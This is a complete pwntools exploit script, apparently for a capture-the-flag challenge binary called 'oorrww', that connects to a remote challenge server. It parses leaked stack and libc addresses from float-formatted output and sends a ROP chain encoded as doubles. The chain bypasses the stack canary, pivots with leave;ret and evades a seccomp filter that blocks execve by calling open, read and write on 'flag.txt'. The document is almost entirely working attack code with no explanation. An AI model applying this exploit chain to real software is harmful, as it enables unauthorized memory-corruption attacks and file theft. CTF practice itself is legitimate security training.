#!/usr/bin/env python3
from pwn import *
from decimal import Decimal

# =========================================================
#                          SETUP                         
# =========================================================
exe = './oorrww'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '193.148.168.30', 7666

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+190
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ seccomp-tools dump ./oorrww 
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
#  0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008
#  0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008
#  0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0008: 0x06 0x00 0x00 0x00000000  return KILL
# └──╼ [★]$ pwn checksec oorrww 
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

# https://stackoverflow.com/questions/1592158/convert-hex-to-float
def convertToDouble(adrr: int) -> bytes:
    payload = p64(adrr).hex()
    payload = struct.unpack('d', bytes.fromhex(payload))[0]
    return str(payload).encode()

def doubleToBytes(d: bytes) -> int:
    b = struct.pack('<d', Decimal(d.decode('utf-8')))
    return u64(b.ljust(8, b'\x00'))

def exploit():
    global io
    io = initialize()
    rop = ROP(libc)

    LEAVE_RET =  rop.find_gadget(['leave', 'ret'])[0]
    SYSCALL = rop.find_gadget(['syscall', 'ret'])[0]
    
    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
    POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
    POP_RCX = rop.find_gadget(['pop rcx', 'ret'])[0]
    POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
    POP_R13 = rop.find_gadget(['pop r13', 'ret'])[0]
    POP_RDX_RBX = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
    POP_R8 = 0x1659e6

    MOV_PTR_RDI_RDX = 0x0bfc63
    MOV_PTR_RDI_RCX = 0x0bfc76 # mov qword ptr [rdi], rcx ; ret
    MOV_PTR_RSI_RDI = 0x0141c51

    io.recvuntil(b'you: ')
    stack = doubleToBytes(io.recvuntil(b' ', drop=True))
    libc.address = doubleToBytes(io.recvuntil(b'!', drop=True)) - libc.sym['__isoc99_scanf']

    payload = [
        libc.address + POP_RCX,
        0x7478742e67616c66,
        libc.address + MOV_PTR_RDI_RCX,
        libc.address + POP_RSI,
        0x0,
        libc.address + 0x011d03d, # mov qword ptr [rdi + 8], rsi ; ret

        libc.sym['open'],

        libc.address + POP_RDI,
        0x3,
        libc.address + POP_RSI,
        stack + 0x560,
        libc.address + POP_RDX_RBX,
        0x40,
        0x0,
        libc.sym['read'],

        libc.address + POP_RDI,
        0x1,
        libc.sym['write']
    ]
    log.info('len: %d', len(payload))
    assert(len(payload) <= 19)
    payload += [0x0] * (19 - len(payload))

    for p in payload:
        io.sendlineafter(b":", convertToDouble(p))

    io.sendlineafter(b":", b'.') # canary
    io.sendlineafter(b":", convertToDouble(stack-8)) # rbp
    io.sendlineafter(b":", convertToDouble(libc.address + LEAVE_RET))

    log.success('stack: %#x', stack)
    log.success('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()

